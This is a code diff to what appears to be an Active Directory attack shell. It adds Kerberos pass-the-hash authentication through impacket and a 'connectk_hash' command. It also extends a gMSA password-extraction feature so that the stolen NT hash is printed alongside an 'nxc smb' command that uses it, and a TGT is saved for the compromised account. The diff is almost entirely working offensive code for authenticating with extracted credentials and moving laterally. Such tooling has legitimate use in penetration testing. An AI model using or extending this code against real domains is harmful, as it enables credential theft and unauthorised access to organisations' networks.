@@ -32,6 +32,75 @@ decision_tree.right = DecisionNode("Connected. Continue")
 user_cache = UserCacheBST()
 
 
+def kerberos_connect(username, domain, dc_ip, password=None, nthash=None):
+    """Request a TGT (password or NT-hash/RC4 preauth) and open an LDAP SASL/Kerberos session.
+
+    Hash-based preauth lets us authenticate on domains where NTLM is disabled,
+    e.g. machine/gMSA accounts: connectk_hash gMSA01$ <nthash> <domain> <dc_ip>
+    Returns the session profile dict, raises on failure.
+    """
+    from impacket.krb5.kerberosv5 import getKerberosTGT
+    from impacket.krb5.types import Principal
+    from impacket.krb5 import constants
+    from impacket.krb5.ccache import CCache
+
+    realm = domain.upper()
+    print(f"[*] Getting TGT for {username}@{realm} via impacket{' (RC4 hash auth)' if nthash else ''}...")
+
+    # Build principal (works with machine accounts like MS01$)
+    user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+    if nthash:
+        # RC4-only etype: the KDC uses the NT hash directly for preauth
+        tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, '', realm, '', nthash, '', dc_ip)
+    else:
+        tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, password, realm, '', '', '', dc_ip)
+
+    # Save to ccache file (same as getTGT.py)
+    ccache = CCache()
+    ccache.fromTGT(tgt, old_session_key, session_key)
+    ccache_file = f"{username}.ccache"
+    ccache.saveFile(ccache_file)
+    os.environ["KRB5CCNAME"] = ccache_file
+    print(f"[+] TGT saved to {ccache_file}")
+
+    # Kerberos needs DC hostname, not IP (for SPN matching)
+    # First get the DC hostname
+    tmp_server = Server(dc_ip, get_info=ALL)
+    tmp_conn = Connection(tmp_server, auto_bind=True)
+    dns_val = tmp_server.info.other.get('dnsHostName')
+    dc_hostname = str(dns_val[0]) if isinstance(dns_val, (list, tuple)) else (str(dns_val) if dns_val else None)
+    tmp_conn.unbind()
+
+    if not dc_hostname:
+        dc_hostname = dc_ip
+        print(f"[!] Could not resolve DC hostname, using IP (may fail)")
+
+    krb5_conf = f"""[libdefaults]
+    default_realm = {realm}
+    dns_lookup_realm = false
+    dns_lookup_kdc = false
+
+[realms]
+    {realm} = {{
+        kdc = {dc_ip}
+        admin_server = {dc_ip}
+    }}
+
+[domain_realm]
+    .{domain.lower()} = {realm}
+    {domain.lower()} = {realm}
+"""
+    with open("/tmp/ldapshell_krb5.conf", "w") as f:
+        f.write(krb5_conf)
+    os.environ["KRB5_CONFIG"] = "/tmp/ldapshell_krb5.conf"
+
+    print(f"[*] Connecting to {dc_hostname} via Kerberos...")
+    server = Server(dc_hostname, get_info=ALL)
+    conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
+    profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":domain_to_dn(domain), "connected_at": time.time(), "domain": domain, "ldaps":False, "kerberos": True, "ccache": ccache_file, "nthash": nthash}
+    return profile
+
+
 def connect(initial_command=None):
     #session = Session()
     global current_session
@@ -97,64 +166,8 @@ def connect(initial_command=None):
             domain = command[3]
             dc_ip = command[4]
 
-            netbios = infer_netbios(domain)
-            base_dn = domain_to_dn(domain)
-
             try:
-                from impacket.krb5.kerberosv5 import getKerberosTGT
-                from impacket.krb5.types import Principal
-                from impacket.krb5 import constants
-                from impacket.krb5.ccache import CCache
-
-                realm = domain.upper()
-                print(f"[*] Getting TGT for {username}@{realm} via impacket...")
-
-                # Build principal (works with machine accounts like MS01$)
-                user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-                tgt, cipher, old_session_key, session_key = getKerberosTGT(user_principal, password, realm, '', '', '', dc_ip)
-
-                # Save to ccache file (same as getTGT.py)
-                ccache = CCache()
-                ccache.fromTGT(tgt, old_session_key, session_key)
-                ccache_file = f"{username}.ccache"
-                ccache.saveFile(ccache_file)
-                os.environ["KRB5CCNAME"] = ccache_file
-                print(f"[+] TGT saved to {ccache_file}")
-
-                # Kerberos needs DC hostname, not IP (for SPN matching)
-                # First get the DC hostname
-                tmp_server = Server(dc_ip, get_info=ALL)
-                tmp_conn = Connection(tmp_server, auto_bind=True)
-                dc_hostname = tmp_server.info.other.get('dnsHostName', [None])[0]
-                tmp_conn.unbind()
-
-                if not dc_hostname:
-                    dc_hostname = dc_ip
-                    print(f"[!] Could not resolve DC hostname, using IP (may fail)")
-
-                krb5_conf = f"""[libdefaults]
-    default_realm = {realm}
-    dns_lookup_realm = false
-    dns_lookup_kdc = false
-
-[realms]
-    {realm} = {{
-        kdc = {dc_ip}
-        admin_server = {dc_ip}
-    }}
-
-[domain_realm]
-    .{domain.lower()} = {realm}
-    {domain.lower()} = {realm}
-"""
-                with open("/tmp/ldapshell_krb5.conf", "w") as f:
-                    f.write(krb5_conf)
-                os.environ["KRB5_CONFIG"] = "/tmp/ldapshell_krb5.conf"
-
-                print(f"[*] Connecting to {dc_hostname} via Kerberos...")
-                server = Server(dc_hostname, get_info=ALL)
-                conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
-                profile = {"ip": dc_ip, "username": username, "password": password, "conn":conn, "base_dn":base_dn, "connected_at": time.time(), "domain": domain, "ldaps":False, "kerberos": True, "ccache": ccache_file}
+                profile = kerberos_connect(username, domain, dc_ip, password=password)
                 if sessions.size() >= MAX_SESSIONS:
                     removed = sessions.items.pop(0)
                     print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
@@ -167,9 +180,32 @@ def connect(initial_command=None):
                 save_password(password)
             except Exception as e:
                 print(f"[-] Connection Failed: {e}")
+        elif command[0] == "connectk_hash":
+            if len(command) < 5:
+                print("connectk_hash <username> <nthash> <domain> <dc_ip> - Kerberos with NT hash (use when NTLM is disabled)")
+                continue
+            username = command[1]
+            nthash = command[2]
+            domain = command[3]
+            dc_ip = command[4]
+            if ':' in nthash:
+                nthash = nthash.split(':')[1]
+            try:
+                profile = kerberos_connect(username, domain, dc_ip, nthash=nthash)
+                if sessions.size() >= MAX_SESSIONS:
+                    removed = sessions.items.pop(0)
+                    print(f"[bold red][!] Session limit reached. Removing oldest session ({removed['username']}@{removed['ip']})[/bold red]")
+                    if current_session == removed:
+                        current_session = None
+                sessions.push(profile)
+                if not current_session:
+                    current_session = profile
+                print(f"[bold green][+] Connected to {domain} via Kerberos (hash auth). Session ID: {sessions.size()-1}[/bold green]")
+            except Exception as e:
+                print(f"[-] Connection Failed: {e}")
         elif command[0] == "connect_hash":
             if len(command) < 5:
-                print("connect_hash <username> <nthash> <domain> <dc_ip>")
+                print("connect_hash <username> <nthash> <domain> <dc_ip>  (NTLM; use connectk_hash if the domain disables NTLM)")
                 continue
             username = command[1]
             nthash = command[2]
@@ -530,7 +566,24 @@ def connect(initial_command=None):
                     print(f"\n[bold green][+] Successfully extracted GMSA password for {target_gmsa}[/bold green]")
                     print(f"[bold cyan]NT Hash: {nt_hash}[/bold cyan]")
                     target_fqdn = f"{target_gmsa[:-1].lower()}.{current_session['domain']}"
-                    print(f"[*] Use it: nxc smb {target_fqdn} -u '{target_gmsa}' -H '{nt_hash}'")
+                    print(f"[*] Use it: nxc smb {target_fqdn} -u '{target_gmsa}' -H '{nt_hash}' -k")
+                    print(f"[*] Open a session here: connectk_hash {target_gmsa} {nt_hash} {current_session['domain']} {current_session['ip']}")
+                    # Best effort: save a TGT ccache for the account (RC4 hash preauth),
+                    # handy for -k tools outside this shell. Does not touch KRB5CCNAME.
+                    try:
+                        from impacket.krb5.kerberosv5 import getKerberosTGT
+                        from impacket.krb5.types import Principal
+                        from impacket.krb5 import constants
+                        from impacket.krb5.ccache import CCache
+                        principal = Principal(target_gmsa, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                        tgt, cipher, old_session_key, session_key = getKerberosTGT(principal, '', current_session['domain'].upper(), '', nt_hash, '', current_session['ip'])
+                        cc = CCache()
+                        cc.fromTGT(tgt, old_session_key, session_key)
+                        cc_file = f"{target_gmsa}.ccache"
+                        cc.saveFile(cc_file)
+                        print(f"[*] Saved TGT for {target_gmsa} to {cc_file} (export KRB5CCNAME={cc_file} to use it)")
+                    except Exception:
+                        pass
 
                 base_dn = current_session["base_dn"]
                 kerberos = current_session.get("kerberos", False)
@@ -742,7 +795,9 @@ if __name__ == "__main__":
     initial_cmd = None
     if args.username and args.target:
         domain = args.domain or args.target
-        if args.kerberos:
+        if args.kerberos and args.hash:
+            initial_cmd = ["connectk_hash", args.username, args.hash, domain, args.target]
+        elif args.kerberos:
             initial_cmd = ["connectk", args.username, args.password, domain, args.target]
         elif args.hash:
             initial_cmd = ["connect_hash", args.username, args.hash, domain, args.target]
